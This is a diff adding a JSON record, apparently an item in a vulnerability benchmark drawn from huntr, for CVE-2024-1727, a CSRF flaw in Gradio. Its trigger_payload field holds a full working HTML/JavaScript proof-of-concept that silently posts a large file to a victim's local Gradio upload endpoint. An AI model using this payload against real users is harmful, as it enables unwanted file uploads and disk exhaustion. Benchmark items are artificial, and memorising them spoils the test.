@@ -1,0 +1,15 @@
+{
+  "file_id": "352_gradio_huntr_a94d55fb-0770-4cbe-9b20-97a978a2ffff",
+  "numeric_id": "352",
+  "library_hint": "gradio",
+  "source": "huntr",
+  "title": "Cross-Site Request Forgery (CSRF) allows attackers to upload large files to a victim's local Gradio instance",
+  "cve": "CVE-2024-1727",
+  "cwe": "CWE-352: Cross-Site Request Forgery (CSRF)",
+  "library": "gradio",
+  "affected_version": ">= 4.16.0, < 4.19.2",
+  "vulnerable_function": "N/A",
+  "triggerability": "direct",
+  "trigger_payload": "<html>\n<body>\n<script>\nfunction submitRequest()\n{\nvar xhr = new XMLHttpRequest();\nxhr.open(\"POST\", \"http://127.0.0.1:7860/upload?upload_id=k9wbugmn37\", true);\nxhr.setRequestHeader(\"Accept\", \"*/*\");\nxhr.setRequestHeader(\"Accept-Language\", \"en-US,en;q=0.5\");\nxhr.setRequestHeader(\"Content-Type\", \"multipart/form-data; boundary=---------------------------226429124014608851241059184049\");\nxhr.withCredentials = true;\nvar body = \"-----------------------------226429124014608851241059184049\\r\\n\"+\n\"Content-Disposition: form-data; name=\\\"files\\\"; filename=\\\"a.php\\\"\\r\\n\"+\n\"Content-Type: application/octet-stream\\r\\n\" +\n\"\\r\\n\" +\n\"aa\".repeat(999999) + \"\\n\"+\n\"\\r\\n\" +\n\"-----------------------------226429124014608851241059184049--\\r\\n\";\nvar aBody = new Uint8Array(body.length);\nfor (var i = 0; i < aBody.length; i++)\n    aBody[i] = body.charCodeAt(i);\nxhr.send(new Blob([aBody]));\n}\nsubmitRequest();\n</script>\n<form action=\"#\">\n<input type=\"button\" value=\"Submit request\" onclick=\"submitRequest();\" />\n</form>\n</body>\n</html>",
+  "oracle": "Files are uploaded to the victim's local system without their knowledge, potentially filling up disk space"
+}
